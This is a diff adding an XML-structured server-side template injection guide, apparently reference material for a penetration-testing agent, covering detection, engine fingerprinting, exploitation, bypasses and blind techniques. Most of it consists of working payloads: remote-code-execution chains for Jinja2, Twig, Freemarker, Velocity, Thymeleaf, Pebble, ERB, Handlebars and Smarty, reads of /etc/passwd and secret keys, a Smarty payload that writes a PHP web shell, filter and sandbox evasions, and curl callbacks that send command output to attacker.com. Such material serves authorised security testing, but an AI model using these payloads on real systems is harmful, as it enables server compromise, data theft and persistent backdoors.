@@ -1,0 +1,330 @@
+<ssti_vulnerability_guide>
+<title>SERVER-SIDE TEMPLATE INJECTION (SSTI)</title>
+
+<critical>SSTI occurs when user input is embedded into server-side templates without proper sanitization. Unlike XSS which executes in browsers, SSTI executes on the server, often leading directly to remote code execution. Template engines provide rich expression languages that attackers can abuse to escape the sandbox.</critical>
+
+<scope>
+- Web applications using template engines (Jinja2, Twig, Freemarker, Velocity, Pebble, Thymeleaf, ERB, Handlebars, Mustache, Smarty)
+- Email template systems with user-controlled content
+- PDF/document generation with template placeholders
+- CMS and marketing platforms with customizable templates
+- Error pages with reflected user input
+- Any feature allowing "personalization" with merge fields
+</scope>
+
+<methodology>
+1. Identify input fields reflected in rendered output
+2. Inject template syntax detection payloads to identify engine type
+3. Determine template engine and version through error messages or behavior
+4. Escalate from expression evaluation to object access
+5. Traverse object hierarchy to reach dangerous classes/methods
+6. Achieve code execution or sensitive data access
+</methodology>
+
+<high_value_targets>
+- Custom email template editors
+- Document/report generation features
+- Theme/skin customization
+- Error message templates with user input reflection
+- Marketing landing page builders
+- Preview functionality for templates
+- Notification message customization
+- PDF generation with user-controlled content
+</high_value_targets>
+
+<detection_payloads>
+<universal_detection>
+- {% raw %}{{7*7}}{% endraw %} - Returns 49 in Jinja2, Twig, and many others
+- ${7*7} - Java EL, Freemarker
+- #{7*7} - Thymeleaf, Ruby ERB
+- {{7*'7'}} - Returns 7777777 in Jinja2 (string multiplication)
+- ${7*'7'} - Throws error or returns 49 depending on engine
+- &lt;%= 7*7 %&gt; - ERB (Ruby)
+- {{constructor.constructor('return 7*7')()}} - JavaScript template engines
+</universal_detection>
+
+<engine_fingerprinting>
+{% raw %}
+Jinja2/Twig differentiation:
+- {{7*'7'}} → Jinja2 returns '7777777', Twig returns '49'
+
+Smarty detection:
+- {$smarty.version} - Returns Smarty version
+- {php}echo 'test';{/php} - PHP execution (older versions)
+
+Freemarker detection:
+- ${.version} or ${.current_template_name}
+- <#assign x=7*7>${x}
+
+Velocity detection:
+- #set($x=7*7)$x
+- $class.inspect("java.lang.Runtime")
+
+Thymeleaf detection:
+- [[${7*7}]] or [(${7*7})]
+- ${T(java.lang.Runtime)}
+{% endraw %}
+</engine_fingerprinting>
+</detection_payloads>
+
+<exploitation_by_engine>
+<jinja2_python>
+{% raw %}
+Basic RCE:
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+
+Modern bypass (Python 3):
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+
+Config access:
+{{ config.items() }}
+{{ config['SECRET_KEY'] }}
+
+Request context:
+{{ request.environ }}
+{{ request.application.__self__._get_data_for_json.__globals__ }}
+
+Lipsum trick:
+{{ lipsum.__globals__['os'].popen('id').read() }}
+
+Cycler trick:
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{% endraw %}
+</jinja2_python>
+
+<twig_php>
+{% raw %}
+Basic execution:
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+File read:
+{{"/etc/passwd"|file_excerpt(1,30)}}
+
+System command:
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
+
+Twig 3.x bypass:
+{{['id']|filter('system')}}
+{{['cat /etc/passwd']|filter('exec')}}
+{% endraw %}
+</twig_php>
+
+<freemarker_java>
+{% raw %}
+Execute class:
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+
+Object instantiation:
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign owc=classloader.loadClass("freemarker.template.utility.ObjectConstructor")>
+<#assign rt=owc.newInstance().newInstance("java.lang.Runtime")>
+
+Built-in bypass:
+${.data_model.getClass().forName("java.lang.Runtime").getRuntime().exec("id")}
+{% endraw %}
+</freemarker_java>
+
+<velocity_java>
+{% raw %}
+Runtime access:
+#set($rt=$class.forName("java.lang.Runtime").getRuntime())
+#set($proc=$rt.exec("id"))
+#set($str=$class.forName("java.util.Scanner"))
+#set($is=$proc.getInputStream())
+$str.getConstructor($is.getClass()).newInstance($is).useDelimiter("\\A").next()
+
+Reflection chain:
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+{% endraw %}
+</velocity_java>
+
+<thymeleaf_java>
+{% raw %}
+SpringEL execution:
+${T(java.lang.Runtime).getRuntime().exec('id')}
+
+Pre-processing:
+__${T(java.lang.Runtime).getRuntime().exec("id")}__::x
+
+URL-based:
+/path?param=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
+
+Fragment injection:
+~{::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__}
+{% endraw %}
+</thymeleaf_java>
+
+<pebble_java>
+{% raw %}
+Execution:
+{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
+
+Beans access:
+{{ beans.get("environment") }}
+{% endraw %}
+</pebble_java>
+
+<erb_ruby>
+{% raw %}
+Basic execution:
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen("id").read %>
+
+File read:
+<%= File.read("/etc/passwd") %>
+
+Backtick execution:
+<%= `cat /etc/passwd` %>
+{% endraw %}
+</erb_ruby>
+
+<handlebars_js>
+{% raw %}
+Prototype access (with vulnerable helpers):
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+{% endraw %}
+</handlebars_js>
+
+<smarty_php>
+{% raw %}
+PHP tag (old versions):
+{php}system('id');{/php}
+
+Static method call:
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+
+Object instantiation:
+{$s=new SplFileObject('/etc/passwd')}{$s->fpassthru()}
+{% endraw %}
+</smarty_php>
+</exploitation_by_engine>
+
+<bypass_techniques>
+<filter_evasion>
+{% raw %}
+Jinja2 attribute access alternatives:
+- {{foo.bar}} == {{foo['bar']}} == {{foo|attr('bar')}}
+- {{foo.__class__}} == {{foo['__class__']}} == {{foo|attr('__class__')}}
+
+String construction:
+- {{'__cla'+'ss__'}} to bypass blacklist
+- {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}} (hex encoding)
+
+Join bypass:
+- {{['__clas','s__']|join}}
+- {{['os']|join}}
+
+Unicode bypass:
+- Use Unicode normalization: ＿＿class＿＿ normalizes to __class__
+{% endraw %}
+</filter_evasion>
+
+<sandbox_escapes>
+{% raw %}
+Jinja2 sandboxed environment escapes:
+- Access via __globals__ of any function
+- Use MRO (Method Resolution Order) traversal
+- Exploit registered filters and globals
+
+Twig sandbox bypass:
+- Abuse allowed methods that return callable objects
+- Chain through __toString magic methods
+{% endraw %}
+</sandbox_escapes>
+
+<waf_bypass>
+- Encode template markers: %7B%7B instead of {% raw %}{{{% endraw %}
+- Use alternative syntax where available
+- Split payload across multiple parameters
+- Abuse template inheritance/includes
+- Time-based blind exploitation when output filtered
+</waf_bypass>
+</bypass_techniques>
+
+<blind_ssti>
+<time_based>
+{% raw %}
+Jinja2:
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/dev/random').read(1) }}
+
+Python sleep:
+{{ cycler.__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}
+
+Java:
+${T(java.lang.Thread).sleep(5000)}
+{% endraw %}
+</time_based>
+
+<out_of_band>
+{% raw %}
+DNS exfiltration:
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('|curl attacker.com?d=$(id|base64)').read() }}
+
+HTTP callback:
+${T(java.lang.Runtime).getRuntime().exec('curl http://attacker.com/callback')}
+{% endraw %}
+</out_of_band>
+
+<error_based>
+- Force errors that include evaluated expressions in message
+- Trigger exceptions with sensitive data in error output
+- Use debug modes that expose evaluation results
+</error_based>
+</blind_ssti>
+
+<validation>
+1. Demonstrate template expression evaluation (e.g., {% raw %}{{7*7}}{% endraw %} returns 49)
+2. Show escalation beyond simple math to object access
+3. Prove code execution with command output or file read
+4. If blind, demonstrate OOB callback or timing difference
+5. Provide minimal payload that achieves impact
+</validation>
+
+<false_positives>
+- Client-side template engines (Vue, Angular, React) - these are XSS, not SSTI
+- Template syntax displayed but not evaluated (escaped output)
+- Sandboxed environments with no dangerous objects accessible
+- Input validation preventing template syntax injection
+</false_positives>
+
+<impact>
+- Remote code execution on application server
+- Full server compromise and lateral movement
+- Sensitive data disclosure (configs, secrets, database credentials)
+- Source code access
+- Internal network access from server position
+- Cryptographic key theft
+</impact>
+
+<pro_tips>
+1. Start with {% raw %}{{7*7}}{% endraw %} and ${7*7} - they detect most engines.
+2. Error messages often reveal the exact template engine and version.
+3. Email template features are frequently vulnerable and overlooked.
+4. PDF generators often use server-side templates for content.
+5. Even sandboxed templates can often be escaped via MRO traversal.
+6. Check for multiple template engines in the same application.
+7. Template injection in logging/error messages can be exploited even without direct output.
+</pro_tips>
+
+<remember>SSTI is one of the most direct paths to RCE. If user input reaches a template engine, assume it's exploitable until proven otherwise. The sandbox escape is often possible through object traversal - every template engine provides some path to dangerous functionality.</remember>
+</ssti_vulnerability_guide>
+
